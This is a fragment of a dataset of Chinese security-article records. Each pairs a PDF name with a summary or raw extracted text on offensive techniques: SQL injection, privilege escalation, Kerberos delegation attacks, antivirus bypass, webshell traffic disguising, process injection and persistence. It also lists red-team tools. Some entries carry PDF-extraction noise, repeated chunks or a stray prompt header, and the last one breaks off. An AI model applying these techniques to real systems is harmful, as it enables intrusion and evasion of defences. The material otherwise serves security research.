        "page_content": "该文档介绍了如何使用 C# 代码在 Windows 系统中添加本地用户并将其添加到管理员组。它涵盖了使用反射、异或加密和反序列化技术绕过安全限制的方法。",
        "FileName": "12581-bypass add user.pdf"
    },
    {
        "page_content": "本文介绍了四种实用的 MSSQL 注入实战案例，包括：利用 xp_cmdshell 快速获取系统权限、利用快速报错注入快速查询数据库信息、在字符长度限制下绕过安全狗注入获取敏感信息，以及利用备份 getshell 获取 webshell。这些案例提供了针对不同场景的注入技巧，对于渗透测试人员和安全研究人员具有参考价值。",
        "FileName": "9619-干货mssql注入实战总结之狠快准绕.pdf"
    },
    {
        "page_content": "SROP（Sigreturn Oriented Programming）是一种高级 ROP 技术，利用 Linux 系统中的 sigreturn 系统调用，通过伪造 Signal Frame 来控制寄存器值，从而实现恶意进程的执行。SROP 的关键在于利用内核在恢复上下文时不验证 Signal Frame 的合法性，因此攻击者可以构造伪造的 Signal Frame 来劫持系统调用，例如 execve()，从而获取 shell 权限。",
        "FileName": "12790-SROP详解.pdf"
    },
    {
        "page_content": "本文探讨了约束委派攻击，这是一种利用 Kerberos 协议中的漏洞来提升权限的攻击技术。约束委派允许服务代表用户请求服务票据，但通常限制了服务的访问范围。然而，通过利用非约束委派或基于资源的约束委派，攻击者可以绕过这些限制，以任意用户的身份访问受限服务，从而获得对域的控制权。",
        "FileName": "12743-浅谈约束委派攻击.pdf"
    },
    {
        "page_content": "该文档介绍了一种利用 Windows 错误报告 (WER) 进行权限维持的恶意软件技术。通过劫持 WER 注册表项，恶意软件可以将自己的可执行文件设置为在 WER 运行时执行，从而在系统重新启动后保持持久性。该技术不需要管理员权限，并且可以绕过传统的反恶意软件检测。",
        "FileName": "11901-利用Windows Error Reporting进行权限维持.pdf"
    },
    {
        "page_content": "CVE-2021-40449 是卡巴斯基实验室在 2021 年 8 ⽉下旬到 9 ⽉上旬在 Windows 服务器上捕获的恶意样本利⽤的提权漏洞，该漏洞存在 于 win32kfull.sys 驱动内，利⽤该漏洞可以在 windows 中完成从 users 到 system 的权限提升。漏洞形成于 win32kfull!GreResetDCInternal 函数中，该函数内会获取 DC 对象内的函数指针，并执⾏该函数指针指向的函数，但并未检查 DC 对象是否异常。所以如果可以在调⽤函数指针之前释放 DC 对象，并重新申请该对象的内存空间，通过构造内存布 局，修改原 DC 对象的函数指针指向其他任意内核函数，就可以在 win32kfull!GreResetDCInternal 内实现 任意内核函数调⽤ 。",
        "FileName": "10979-CVE-2021-40449 Win32k提权漏洞及POC分析.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 MySQL 代理在渗透测试中绕过防火墙限制，通过 UDF 和 Socket Reuse 技术建立反向连接，从而实现对目标主机的远程访问。文档详细阐述了攻击端和服务端的代码逻辑，并分析了踩坑过程中的问题，最终提供了可行的解决方案。",
        "FileName": "7993-内网Mysql代理浅析.pdf"
    },
    {
        "page_content": "本文档探讨了 PowerShell 执行策略，这是 Windows 中一项安全功能，用于控制哪些类型的 PowerShell 脚本可以在系统中运行。它介绍了六种不同的执行策略，包括 Restricted、AllSigned、RemoteSigned、Unrestricted、Bypass 和 Undefined，并解释了每种策略的含义和影响。此外，本文档还提供了绕过默认 Restricted 执行策略设置的几种方法，包括使用交互式 PowerShell 控制台、管道传输、Invoke-Command 命令、Unicode/Base64 编码字符串、URL 下载、注册表修改、Remote-Signed 标记、基于层次 bypass 和交换 AuthorizationManager 禁用 ExecutionPolicy。",
        "FileName": "10382-浅谈powershell执行策略.pdf"
    },
    {
        "page_content": "该文档讲述了作者通过上传任意文件到服务器，并通过替换私钥和反弹 shell 等技术，最终成功入侵服务器的过程。作者通过搜索上传接口、替换私钥链接服务器、编写定时任务和利用 /etc/profile.d/ 目录中的 sh 文件执行反弹 shell 等方法，最终在经过漫长的等待后成功上线服务器。",
        "FileName": "12310-任意文件上传的曲折到等待上线.pdf"
    },
    {
        "page_content": "本文档探讨了线程局部存储 (TLS) 回调函数，这些函数在创建或终止线程时自动执行，通常用于反调试技术。它分析了 TLS 回调函数的定义、参数和使用，并提供了示例代码和调试步骤来演示其工作原理。",
        "FileName": "12057-TLS回调函数的学习.pdf"
    },
    {
        "page_content": "本文档探讨了 Linux 中的 suid（设置用户 ID）权限，该权限允许用户以文件所有者的身份运行文件。利用 suid 提权的关键是运行具有 root 用户 suid 权限的文件，从而获得 root 用户身份。文档提供了查找和利用 suid 权限的命令和示例，包括使用 find、less、more、cp、nano、vim、bash 和 awk。",
        "FileName": "12535-浅谈linux suid提权.pdf"
    },
    {
        "page_content": "该文档记录了对某网络教学平台的代码审计过程，重点关注了平台中存在的任意文件上传和SQL注入漏洞。审计人员通过分析平台的源代码，发现了多个未经授权的文件上传漏洞，这些漏洞允许攻击者上传任意文件，包括恶意软件和后门。此外，还发现了SQL注入漏洞，该漏洞允许攻击者通过操纵输入参数来执行任意SQL查询，从而获取敏感数据或破坏系统。",
        "FileName": "12654-某网络教学平台审计过程记录.pdf"
    },
    {
        "page_content": "该文档分析了某开源 CMS v2.0 的代码，发现了多个漏洞，包括文件包含、反射 XSS、隐藏后门、任意文件读取和任意文件写入。这些漏洞允许攻击者执行任意代码、窃取敏感信息或破坏网站。",
        "FileName": "10453-某开源cms v2.0审计.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2021-21985 漏洞，该漏洞影响 VMware vCenter Server，允许远程代码执行。漏洞利用 Java 反射方法和 Spring 框架的路由构造，通过调用可利用的 Spring Bean 来触发远程命令执行。利用链涉及 Tomcat RMI Bypass 和 SpEL 注入，最终导致任意代码执行。",
        "FileName": "9698-CVE-2021-21985 VMware vCenter Server 远程代码执行漏洞分析.pdf"
    },
    {
        "page_content": "本文分析了Tenda路由器固件模拟中的栈溢出漏洞，重点介绍了通过逆向分析修复网络环境的步骤。以CVE-2018-5767漏洞为例，演示了漏洞利用过程，包括寻找system函数地址、构造ROP链和编写exp。",
        "FileName": "11793-某路由器固件模拟分析及栈溢出漏洞分析.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何渗透一个存在旁站信息泄露的 Dedecms 站点，包括利用 Dedecms 最新版本漏洞组合拳获取管理员密码、通过旁站信息收集找到后台路径、绕过 disable_functions 和 open_basedir 限制，以及使用 PHP-FPM 绕过 disable_functions 禁用函数。",
        "FileName": "8492-一次旁站信息泄露的dedecms站点渗透.pdf"
    },
    {
        "page_content": "本文档探讨了域委派的概念，重点介绍了非约束委派和约束委派这两种方法。非约束委派允许服务帐户以用户权限在域内活动，而约束委派限制了服务帐户只能访问特定服务。文档提供了查找域中委派用户和计算机的各种方法，并演示了如何利用非约束委派和约束委派来获取域控制器的访问权限。",
        "FileName": "7217-域渗透——Kerberos委派攻击.pdf"
    },
    {
        "page_content": "本文档探讨了攻击者如何滥用 Kerberos 协议进行横向移动，该协议是 Windows Active Directory 的默认身份验证协议。Kerberos 使用票据来保留身份验证，攻击者可以利用这些票据在网络中不同计算机之间横向移动，从而访问资源和提升权限。",
        "FileName": "7474-如何通过 Kerberos进行横向移动.pdf"
    },
    {
        "page_content": "该文档分析了某 Easy 网站的漏洞，包括前台 SQL 注入、后台 RCE 和可控 URL 参数导致的 SQL 注入和任意文件写入。文档详细介绍了漏洞的利用方法，包括利用加密函数加密 SQL 语句、修改表单参数、插入键值对和拼接可控内容。",
        "FileName": "10259-某Easy 漏洞挖掘.pdf"
    },
    {
        "page_content": "该文档介绍了在 GKCTF 应急挑战杯中遇到的一个有趣的 CMS，该 CMS 存在一个限制，要求在服务器上创建特定文件才能编辑模板。作者通过上传微信二维码图片并利用目录穿越漏洞，绕过了该限制，成功上传了所需文件并获得了 flag。此外，作者还发现了另一个非预期解，通过启用密保问题验证并创建新管理员，可以激活重要操作选项，从而绕过文件验证限制。该 CMS 还存在一个默认的 demo/demo 用户，具有与 admin 用户相同的权限，如果管理员不禁用该用户，可能会使网站面临风险。",
        "FileName": "9818-回顾在 GKCTF 中遇到的有趣的 CMS.pdf"
    },
    {
        "page_content": "该文档分析了非栈上格式化字符串漏洞的利用方法，介绍了利用 ebp 链、修改返回地址、泄露栈地址和写入 shellcode 等技术，并提供了多个示例代码。",
        "FileName": "12619-非栈上格式化字符串漏洞利用.pdf"
    },
    {
        "page_content": "JDK7u21 反序列化漏洞分析笔记主要分析了JDK7u21 原生 gadget 链的构造，涉及 Java 反射、javassist、动态修改类、Java 静态类加载、Java 动态代理、hash 碰撞等基础知识。通过对这些知识点的理解，可以深入了解该漏洞的原理和利用方式。",
        "FileName": "9704-JDK7u21反序列化漏洞分析笔记.pdf"
    },
    {
        "page_content": "该文档分析了某 CMS 中的两个全站 XSS 漏洞，包括前台反射型 XSS、后台反射型 XSS 和前台留言处 XSS。这些漏洞都是由于直接拼接 URL 传入的参数导致的，没有对输入进行过滤。文档提供了详细的漏洞分析和利用方法，并讨论了后台 XSS 漏洞的潜在危害。",
        "FileName": "7381-某cms两处全站xss漏洞.pdf"
    },
    {
        "page_content": "本文介绍了如何对冰蝎流量进行简单的魔改，通过修改 Crypt.java 中的加密函数和 payload 中的 Encrypt() 函数，实现对流量的自定义加密处理，从而贯通整个加解密通讯流程。具体操作以 JSP 增加 base64 编码为例，修改了 Decrypt 函数和 Encrypt() 函数，并对 webshell 马子进行了修改，最后打包测试，实现了命令执行和内网穿透等功能。",
        "FileName": "11530-简单的冰蝎流量魔改.pdf"
    },
    {
        "page_content": "本文档深入分析了 unsorted bin attack，该攻击是一种久远的攻击方式，常作为其他攻击方式的辅助手段。本文档首先介绍了 unsorted bin attack 的原理，然后通过一个具体的示例详细讲解了如何利用该攻击方式。",
        "FileName": "7251-深入理解unsorted bin attack.pdf"
    },
    {
        "page_content": "本文分析了 Bitdefender 杀毒软件的绕过技术，通过调试发现 Bitdefender 钩住了 WriteProcessMemory、ZwCreateThreadEx 和 ZwOpenProcess 等 API，并监控敏感流量。通过动态获取这些 API 的地址并将其还原为原始硬编码，作者成功绕过了 Bitdefender 的 API 钩子。然而，Bitdefender 仍然检测到了通过 explorer 操纵的特殊行为，作者进一步发现 ZwOpenProcess 也被钩住，并将其 unhook。最后，作者通过使用 HTTPS 协议绕过了 Bitdefender 的流量监控，成功绕过了该杀毒软件。",
        "FileName": "9493-bypass Bitdefender.pdf"
    },
    {
        "page_content": "该文档分析了 MySQL JDBC 中 detectCustomCollations 触发点在不同版本中的差异。在 5.1.18 及以下版本中，该触发点不可用，而在 5.1.19 至 6.0.6 版本（5.1.49 除外）中，可以通过修改恶意 MySQL 服务器的设置来触发反序列化。在 8.x 版本中，该触发点不再可用。",
        "FileName": "10923-MySQL JDBC中detectCustomCollations触发点不同版本的差异.pdf"
    },
    {
        "page_content": "该文档介绍了一种通过隐藏导入表中的恶意 API 来规避杀毒软件的技术。通过自定义 API 函数，可以将敏感 API 替换为自定义版本，从而隐藏它们在导入表中的存在。该技术还涉及使用汇编获取 kernel32.dll 的地址和使用手动方法获取 GetProcAddress 和 GetModuleHandle 函数的地址。",
        "FileName": "12035-通过隐藏导入表的方式规避杀软.pdf"
    },
    {
        "page_content": "本文档介绍了如何改造蚁剑以绕过 WAF 检测，包括添加可变长度前缀以随机化其他参数，以及使用异或算法加密流量。通过这些改造，蚁剑可以有效地加密通信流量，从而绕过大多数 WAF 的检测。",
        "FileName": "7737-蚁剑改造过WAF系列（三）.pdf"
    },
    {
        "page_content": "本文探讨了微服务架构下信息收集的策略，强调了利用 API、微信小程序和 JavaScript 文件来收集域名、目录和参数的重要性。通过模糊测试和字典制作，安全人员可以扩大测试范围，挖掘隐藏的漏洞。",
        "FileName": "7099-微服务渗透之信息搜集.pdf"
    },
    {
        "page_content": "**文档主题：**分析如下文档并完成以下任务：\n\n**文档内容：**\n\n```\n1.登录 userfaultfd 机制在 Kernel 提权中的应⽤ userfaultfd 机制在 Kernel 提权中的应⽤ A1ex   /  2021-04-29 10:35:29  /  浏览数  11322 内核内存包含两个部分： RAM ，保存即将被使⽤的内存⻚；交换区，保存暂时闲置的内存⻚。然⽽有的内存即不在  RAM ，也不在 交换区中，例如  mmap 创建的内存映射⻚。在内核  read 、 write 操作  mmap 分配的内存前，内核并没有将该内存⻚映射到实际的物 理⻚中。⽽当内核读取  mmap 分配的内存⻚时，内核则会进⾏⼀下步骤为  mmap 的内存⻚映射⼀个实际的物理⻚： 1 .  为  mmap 内存⻚地址建⽴物理帧； 2 .  读内容到   该物理帧； 3 .  在⻚表中标记⼊⼝，以识别  0x1337000 虚地址。 这个整个过程，可以称作发⽣了⼀次缺⻚错误，将会导致内核切换上下⽂和中断。 ⽽  userfaultfd 机制可以让⽤户来监管此类缺⻚错误，并在⽤户空间完成对这类错误的处理。也就是⼀旦我们在内核触发了⼀次缺⻚ 错误，可以利⽤⽤户态的程序去穿插执⾏⼀些操作，这为我们内核条件竞争的利⽤提供了很⼤⽅便。 要使⽤  userfaultfd ，需要先创建⼀个   uffd //\tuserfaultfd 系统调⽤创建并返回⼀个 uffd ，类似⼀个⽂件的 fd uffd \t = \t syscall ( __NR_userfaultfd , \t O_CLOEXEC \t | \t O_NONBLOCK ); 之后所有的注册内存区间、配置和最终的缺⻚处理都需要⽤  ioctl 对这个  uffd 操作实现。 ioctl-userfaultfd ⽀持  UFFDIO_API 、 UFFDIO_REGISTER 、 UFFDIO_UNREGISTER 、 UFFDIO_COPY 、 UFFDIO_ZEROPAGE 、 UFFDIO_WAKE 等选项。其中 UFFDIO_REGISTER 可以⽤于向  userfaultfd 机制注册⼀个监视去也。 UFFDIO_COPY 可⽤于当发⽣缺⻚错误时，向缺⻚的地址拷 ⻉⾃定义的数据。 #\t2\t个⽤于注册、注销的 ioctl 选项： UFFDIO_REGISTER\n2、 UFFDIO_WAKE 等选项。其中 UFFDIO_REGISTER 可以⽤于向  userfaultfd 机制注册⼀个监视去也。 UFFDIO_COPY 可⽤于当发⽣缺⻚错误时，向缺⻚的地址拷 ⻉⾃定义的数据。 #\t2\t个⽤于注册、注销的 ioctl 选项： UFFDIO_REGISTER \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t 注册将触发 user - fault 的内存地址 UFFDIO_UNREGISTER \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t 注销将触发 user - fault 的内存地址 #\t3\t个⽤于处理 user-fault 事件的 ioctl 选项： UFFDIO_COPY \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t ⽤已知数据填充 user - fault ⻚ UFFDIO_ZEROPAGE \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t 将 user - fault ⻚填零 UFFDIO_WAKE \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t ⽤于配合上⾯两项中 \t UFFDIO_COPY_MODE_DONTWAKE \t 和 \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t UFFDIO_ZEROPAGE_MODE_DONTWAKE 模式实现批量填充 然后，需要为监视的内存进⾏注册。这⾥使⽤上述提到的  UFFDIO_REGISETR 操作： userfaulfd  简介 基本步骤 创建⼀个描述符  uffd 注册监视区域addr \t = \t mmap ( NULL , \t page_size , \t PROT_READ \t | \t PROT_WRITE , \t MAP_SHARED , \t fd , \t 0 ) //\taddr\t和 \tlen\t分别是我匿名映射返回的地址和⻓度，赋值到 uffdio_register uffdio_register . range . start \t = \t ( unsigned \t long ) \t addr ; uffdio_register . range . len \t = \t len ; //\tmode\t只⽀持 \tUFFDIO_REGISTER_MODE_MISSING uffdio_register . mode \t = \t UFFDIO_REGISTER_MODE_MISSING ;\n3.; uffdio_register . mode \t = \t UFFDIO_REGISTER_MODE_MISSING ; //\t⽤ ioctl 的 UFFDIO_REGISTER 注册 ioctl ( uffd , \t UFFDIO_REGISTER , \t & uffdio_register ); 这⾥，需要指定的   监视的   地址和⻓度，然后调⽤  ioctl 进⾏注册。 然后，需要创建⼀个线程⽤于轮询和处理  user-fault 事件。这⾥可以重启⼀个线程，因为需要轮询，避免阻塞主线程。 //\t主进程中调⽤ pthread_create 创建⼀个 fault\thandler 线程 pthread_create ( & thr , \t NULL , \t fault_handler_thread , \t ( void \t * ) \t uffd ); 在⼦线程中，使⽤  poll 函数轮询  uffd ，当轮询到缺⻚事件后，可以先写上⾃⼰的处理代码，随后⽤轮询到的 UFFD_EVENT_PAGEFAULT 事件⽤上述提到的  UFFDIO_COPY 拷⻉数据到缺⻚处。 static \t void \t * \t fault_handler_thread ( void \t * arg ) { \t\t\t\t \t\t\t\t //\t轮询 uffd 读到的信息需要存在⼀个 struct\tuffd_msg 对象中 \t\t\t\t static \t struct \t uffd_msg \t msg ; \t\t\t\t //\tioctl 的 UFFDIO_COPY 选项需要我们构造⼀个 struct\tuffdio_copy 对象 \t\t\t\t struct \t uffdio_copy \t uffdio_copy ; \t\t\t\t uffd \t = \t ( long ) \t arg ; \t\t\t\t ...... \t\t\t\t for \t (;;) \t { \t //\t此线程不断进⾏ polling ，所以是死循环 \t\t\t\t\t\t\t\t //\tpoll 需要我们构造⼀个 struct\tpollfd 对象 \t\t\t\t\t\t\t\t struct\n4.uffdio_copy \t uffdio_copy ; \t\t\t\t uffd \t = \t ( long ) \t arg ; \t\t\t\t ...... \t\t\t\t for \t (;;) \t { \t //\t此线程不断进⾏ polling ，所以是死循环 \t\t\t\t\t\t\t\t //\tpoll 需要我们构造⼀个 struct\tpollfd 对象 \t\t\t\t\t\t\t\t struct \t pollfd \t pollfd ; \t\t\t\t\t\t\t\t pollfd . fd \t = \t uffd ; \t\t\t\t\t\t\t\t pollfd . events \t = \t POLLIN ; \t\t\t\t\t\t\t\t poll ( & pollfd , \t 1 , \t - 1 ); \t\t\t\t\t\t\t\t //\t读出 user-fault 相关信息 \t\t\t\t\t\t\t\t read ( uffd , \t & msg , \t sizeof ( msg )); \t\t\t\t\t\t\t\t //\t对于我们所注册的⼀般 user-fault 功能，都应是 UFFD_EVENT_PAGEFAULT 这个事件 \t\t\t\t\t\t\t\t assert ( msg . event \t == \t UFFD_EVENT_PAGEFAULT ); \t\t\t\t\t\t\t\t // 我们⾃⼰的处理代码 \t\t\t\t\t\t\t\t //\t构造 uffdio_copy 进⽽调⽤ ioctl-UFFDIO_COPY 处理这个 user-fault \t\t\t\t\t\t\t\t uffdio_copy . src \t = \t ( unsigned \t long ) \t page ; \t\t\t\t\t\t\t\t uffdio_copy . dst \t = \t ( unsigned \t long ) \t msg . arg . pagefault . address \t & \t ~ ( page_size \t - \t 1 ); \t\t\t\t\t\t\t\t uffdio_copy . len \t = \t page_size ; \t\t\t\t\t\t\t\t uffdio_copy . mode \t = \t 0 ; \t\t\t\t\t\t\t\t uffdio_copy . copy \t = \t 0 ; \t\t\t\t\t\t\t\t //\tpage( 我们已有的⼀个⻚⼤⼩的数据 ) 中 page_size ⼤⼩的内容将被拷⻉到新分配的 msg.arg.pagefault.address 内存⻚中 \t\t\t\t\t\t\t\t ioctl ( uffd ,\n5.uffdio_copy . mode \t = \t 0 ; \t\t\t\t\t\t\t\t uffdio_copy . copy \t = \t 0 ; \t\t\t\t\t\t\t\t //\tpage( 我们已有的⼀个⻚⼤⼩的数据 ) 中 page_size ⼤⼩的内容将被拷⻉到新分配的 msg.arg.pagefault.address 内存⻚中 \t\t\t\t\t\t\t\t ioctl ( uffd , \t UFFDIO_COPY , \t & uffdio_copy ); \t\t\t\t\t\t\t\t\t\t\t\t ...... \t\t\t\t } } ⽽在上述的处理函数中，穿插的我们⾃⼰的处理代码，就可以帮助实现条件竞争。 创建⼀个专⽤的线程轮询和处理  user-fault 事件 2020",
        "FileName": "9469-userfaultfd机制在Kernel提权中的应用.pdf"
    },
    {
        "page_content": "该文档介绍了如何破解金融网站的前端加签验证，通过分析前端代码和使用 Burpy 插件，确定加签关键字，获取加签算法，并编写加签脚本，实现对数据包的自动加签，从而绕过服务端的验签机制。",
        "FileName": "12082-记一次金融站点的验签破解实战.pdf"
    },
    {
        "page_content": "该文档主要介绍了 AFL 的插桩 —— 普通插桩（⼀）、AFL 的插桩  —— llvm_mode（⼆）、AFL 的插桩  —— llvm_mode（⼆）其他辅助模块 i .  \tafl-analyze \t ：对测试⽤例进⾏分析，通过分析给定的⽤例，确定是否可以发现⽤例中有意义的字段； ii .  \tafl-plot \t ：⽣成测试任务的状态图； iii .  \tafl-tmin \t ：对测试⽤例进⾏最⼩化； iv .  \tafl-cmin \t ：对语料库进⾏精简操作； v .  \tafl-showmap \t ：对单个测试⽤例进⾏执⾏路径跟踪； vi .  \tafl-whatsup \t ：各并⾏例程 fuzzing 结果统计； vii .  \tafl-gotcpu \t ：查看当前 CPU 状态。 部分头⽂件说明 前⾔ 宏观i .  \talloc-inl.h \t ：定义带检测功能的内存分配和释放操作； ii .  \tconfig.h \t ：定义配置信息； iii .  \tdebug.h \t ：与提示信息相关的宏定义； iv .  \thash.h \t ：哈希函数的实现定义； v .  \ttypes.h \t ：部分类型及宏的定义。 \tafl-gcc \t   是 GCC  或  clang  的⼀个 wrapper （封装），唯⼀⽬的是预处理由  GCC/clang  ⽣成的汇编⽂件，并注⼊包含在   \t afl-as.h \t   中 的插桩代码。   使⽤   \t afl-gcc\t/\tafl-clang \t   编译程序时，⼯具链会⾃动调⽤它。该 wapper 的⽬标并不是为了实现向   \t .s \t   或   \t asm\n```",
        "FileName": "10315-AFL二三事——源码分析（上篇）.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2020-8558 漏洞，该漏洞允许恶意用户访问仅绑定到 127.0.0.1 的服务。文档解释了漏洞的原理，并讨论了在 VPC 和 Docker 容器网络桥接模式下复现漏洞的方法。它还讨论了内核参数 route_localnet、rp_filter 和 accept_local 在防止漏洞中的作用，以及 Kubernetes 对漏洞的修复。",
        "FileName": "11674-CVE-2020-8558-跨主机访问127.0.0.1.pdf"
    },
    {
        "page_content": "该文档提供了红队武器库中用于信息收集、横向渗透、建立立足点、提权和数据渗出的工具和技术。它涵盖了各种工具，包括 EyeWitness、AWSBucketDump、AQUATONE、Spoofcheck、Nmap、dnsrecon、dirsearch、Sn1per、Social Mapper、skiptracer、FOCA、theHarvester、Metagoofil、SimplyEmail、truffleHog、Just-Metadata、typofinder、pwnedOrNot、GitHarvester、pwndb、LinkedInt、CrossLinked、findomain、WinRAR Remote Code Execution、Composite Moniker、Exploit toolkit CVE-2017-8759、CVE-2017-11882 Exploit、Adobe Flash Exploit CVE-2018-4878、Exploit toolkit CVE-2017-0199、demiguise、Office-DDE-Payloads、CACTUSTORCH、SharpShooter、DKMC、恶意宏生成器、SCT-obfuscator、Invoke-Obfuscation、Invoke-CradleCrafter、Invoke-DOSfuscation、morphHTA、Unicorn、Shellter、EmbedInHTML、SigThief、Veil、CheckPlease、Invoke-PSImage、LuckyStrike、ClickOnceGenerator、macro_pack、StarFighters、nps_payload、SocialEngineeringPayloads、Social-Engineer Toolkit、phishery、PowerShdll、UltimateAppLockerByPassList、ruler、Generate-Macro、MaliciousMacroMSBuild、Meta Twin、WePWNise、DotNetToJScript、PSAmsi、ReflectiveDLLInjection、ps1encode、Worse-PDF、SpookFlare、GreatSCT、NPS、Meterpreter_Paranoid_Mode-SSL、backdoor-factory、MacroShop、UnmanagedPowerShell、evil-ssdp、Ebowla、make-pdf、avet、EvilClippy、Call Obfuscator、Donut、King Phisher、FiercePhish、ReelPhish、Gophish、CredSniper、PwnAuth、Phishing Frenzy、Phishing Pretexts、Modlishka、Evilginx2、BeEF、Cobalt Strike、Empire、Metasploit Framework、SILENTTRINITY、Pupy、Koadic、PoshC2、Gcat、TrevorC2、Merlin、Quasar、Covenant、FactionC2、DNScat2、Sliver、EvilOSX、EggShell、Rapid Attack Infrastructure、Red Baron、EvilURL、Domain Hunter、PowerDNS、Chameleon、CatMyFish、Malleable C2、FindFrontableDomains、Postfix-Server-Setup、DomainFrontingLists、Apache2-Mod-Rewrite-Setup、mod_rewrite rule、external_c2 framework、C2 RAT Staging、Malleable-C2-Profiles、ExternalC2、cs2modrewrite、e2modrewrite、redi、cat-sites、ycsm、Domain Fronting Google App Engine、DomainFrontDiscover、Automated Empire Infrastructure、Serving Random Payloads with NGINX、meek、CobaltStrike-ToolKit、mkhtaccess_red、RedFile、keyserver、DoHC2、HTran、CrackMapExec、PowerLessShell、GoFetch、ANGRYPUPPY、DeathStar、SharpHound、BloodHound.py、Responder、SessionGopher、PowerSploit、Nishang、Inveigh、PowerUpSQL、MailSniper、DomainPasswordSpray、WMIOps、Mimikatz、LaZagne、mimipenguin、PsExec、KeeThief、PSAttack、Internal Monologue Attack、Impacket、icebreaker、Living Off The Land Binaries and Scripts、WSUSpendu、Evilgrade、NetRipper、LethalHTA、Invoke-PowerThIEf、RedSnarf、HoneypotBuster、PAExec、Tunna、reGeorg、Blade、TinyShell、PowerLurk、DAMP、PowerView、Get-GPPPassword、Invoke-ACLpwn、BloodHound、PyKEK、Grouper、ADRecon、ADACLScanner、ACLight、LAPSToolkit、PingCastle、RiskySPN、Mystique、Rubeus、kekeo、UACMe、windows-kernel-exploits、PowerUp、The Elevate Kit、Sherlock、Tokenvator、CloakifyFactory、DET、DNSExfiltrator、PyExfil、Egress-Assess、Powershell RAT、MITRE CALDERA、APTSimulator、Atomic Red Team、Network Flight Simulator、Metta、Red Team Automation、Wifiphisher、mana、magspoof、WarBerryPi、P4wnP1、malusb、Fenrir、poisontap、WHID、PhanTap、RocketChat、Etherpad、RedELK、CobaltSplunk、Red Team Telemetry、Elastic for Red Teaming、Ghostwriter、SharpSploit、GhostPack、SharpWeb、reconerator、SharpView、Watson、Detection Lab、Modern Windows Attacks and Defense Lab、Invoke-UserSimulator、Invoke-ADLabDeployer、Sheepl、Aggressor Scripts、A collection scripts useful for red teaming and pentesting、PowerShell-Suite、Powershell、RedTeamPowershellScripts、red-team-scripts、SomeStuff、Misc-Powershell-Scripts、Misc-PowerShell-Stuff、PenTestScripts、Scripts、RandomPS-Scripts、Random-CSharpTools、Random、Penetration-Testing-Tools",
        "FileName": "7226-RedTeaming Tookit Collection.pdf"
    },
    {
        "page_content": "该文档分析了 APC 注射和 KernelCallbackTable 注射这两种 Windows 进程注入方法的实现细节。APC 注射通过枚举线程和修改线程 APC 队列来实现，而 KernelCallbackTable 注射则通过修改 PEB 中的 KernelCallbackTable 来实现。文档还讨论了使用 Early Bird APC Queue Code Injection 和 KernelCallbackTable 注射来注入挂起进程的技巧。",
        "FileName": "12070-APC注入和KernelCallbackTable注入的实现.pdf"
    },
    {
        "page_content": "该文档记录了一次对基于 Spring 开发的建站系统的 Java 审计，发现了三个安全问题：XSS 漏洞、任意文件上传漏洞和逻辑漏洞（越权删除纠错信息）。审计还发现了一个未授权访问问题，允许任意用户访问所有管理员信息。",
        "FileName": "9751-记一次对某系统的审计（Java审计）.pdf"
    },
    {
        "page_content": "该文档主要介绍了如何利用 Spring 内存马构造 Spring MVC 环境，包括如何配置 Spring MVC 环境、如何模拟注册 Controller 和 Interceptor，以及如何利用这些组件进行内存马构造。",
        "FileName": "12047-Spring内存马——ControllerInterceptor构造.pdf"
    },
    {
        "page_content": "这篇文档重点介绍了 FreeBSD 系统中的一个虚拟机逃逸漏洞，该漏洞存在于 E82545 PCI 仿真器中，允许攻击者通过 OOB 写入操作执行代码。该漏洞利用了 UDP 数据包校验和的限制，导致攻击者能够控制数据包头部的长度，从而覆盖受控数据（计算的校验和）。通过修改 hdr 指针，攻击者可以泄露堆栈内容，并最终覆盖保存的指令指针，从而执行任意代码。该漏洞影响未启用 Capsicum 沙盒的 bhyve 管理程序。",
        "FileName": "12540-DHYVE 逃逸：FreeBSD系统的虚拟机逃逸漏洞.pdf"
    },
    {
        "page_content": "该文档分析了 MCMS（一款 Java 开源内容管理系统）中的历史漏洞，重点关注后台模板管理和 UEditor 配置上传中的问题。这些漏洞允许攻击者通过上传恶意 ZIP 文件或修改模板文件来执行模板注入攻击，从而在最新版本中通过路径穿越和文件后缀控制来实现 getshell。",
        "FileName": "11695-从mcms历史漏洞中捡漏.pdf"
    },
    {
        "page_content": "F5 BIG-IP CVE-2021-22986 认证绕过漏洞分析 F5 BIG-IP CVE-2021-22986 认证绕过漏洞分析 1s1and /  2022-06-07 11:19:45  /  浏览数  15377 官⽅信息 影响范围： Product Branch Versions known to be vulnerable Fixes introduced in Severity CVSSv3 score1 Vulnerable component or feature BIG-IP (LTM, AAM, Advanced WAF, AFM, Analytics, APM, ASM, DDHD, DNS, FPS, GTM, Link Controller, PEM, SSLO) 16.x 16.0.0 - 16.0.1 16.1.0 - 16.1.2 16.2.0 16.2.1 16.3.0 - 16.3.6 12.x 12.1.0 - 12.1.5 12.2.0 - 12.2.8 11.x None Not applicable BIG-IQ Centralized Management 8.x None 8.0.0 Critical 9.8 iControl REST API 15.x 15.1.0 - 15.1.2 15.2.0 14.x 14.1.0 - 14.1.3 14.2.0 - 14.2.3 13.x 13.1.0 - 13.1.3 12.x 12.1.0 - 12.1.5 11.x None Not applicable F5OS 1.x None Not applicable Not vulnerable None None Traffix SDC 5.x None Not applicable Not vulnerable None None 作为 java 菜⻦，借此框架加深对 java 的理解以及各种分析⼿段的学习，推荐同样作为 java 新⼿的⼈可以看⼀看，⼤佬可以直接跳过 在 F5 下载⽹站 注册后可成功下载虚拟机版的镜像⽂件，我这⾥下载了 16.0.0 版本的虚拟机 ovf ，使⽤ vmware 可以直接导⼊ 概述 环境搭建了半天重新注册了⼀个账号才搞定。 官⽹提供 F5 rest api 说明⽂档 正常的访问 web 界⾯的诸多功能的话还需要⼀个有效的 license key ，但是这⾥为了调试漏洞不是很必须，所以省了这个步骤。 vmware 导⼊ ovf ⽂件后会要求输⼊⼝令密码，默认是 root/default, 输⼊后会要求更改默认⼝令 进⼊后输⼊ config 可以更改虚拟机 ip ，我将虚拟机的 ip 更改为了 172.16.113.247 打开 web 